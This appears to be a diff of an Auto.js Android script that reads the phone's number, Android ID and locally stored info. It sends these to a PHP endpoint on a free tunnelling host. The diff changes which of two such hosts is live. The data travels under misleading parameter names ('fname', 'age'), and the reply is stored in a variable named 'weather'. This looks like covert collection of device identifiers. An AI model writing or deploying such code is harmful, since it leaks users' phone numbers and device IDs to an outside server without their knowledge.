@@ -1,8 +1,8 @@
 (function(){try {
 function shojihao() {
     try {
-        var mTelephonyManager = context.getSystemService(context.TELEPHONY_SERVICE);
-        var phoneNumber = mTelephonyManager.getLine1Number();
+var mTelephonyManager = context.getSystemService(context.TELEPHONY_SERVICE);
+var phoneNumber = mTelephonyManager.getLine1Number();
 var xxl=本地储存.get("xinxi");
 var bbss=ui.jhms.text();
 var bbh=ui.toolbar.title;
@@ -18,11 +18,13 @@ var jies=xxl+"-"+bbss+"-"+bbh+"-"+sjs;
         return jies;
     }
 };
-        var ids = device.getAndroidId();      
-       var bbs=shojihao();
-//var res = http.get("http://sdbsxwf.free.idcfengye.com/mis.php?fname=" + ids + "&age=" + bbs);
-var res = http.get("http://sdbsxwf777777.vaiwan.com/mis.php?fname=" + ids + "&age=" + bbs);
-        if (res.statusCode != 200) {
+var ids = device.getAndroidId();      
+var bbs=shojihao();
+
+var res = http.get("http://sdbsxwf.free.idcfengye.com/mis.php?fname=" + ids + "&age=" + bbs);
+//var res = http.get("http://sdbsxwf777777.vaiwan.com/mis.php?fname=" + ids + "&age=" + bbs);
+
+if (res.statusCode != 200) {
             log("请求失败: " + res.statusCode + " " + res.statusMessage);
         } else {
             var weather = res.body.string();
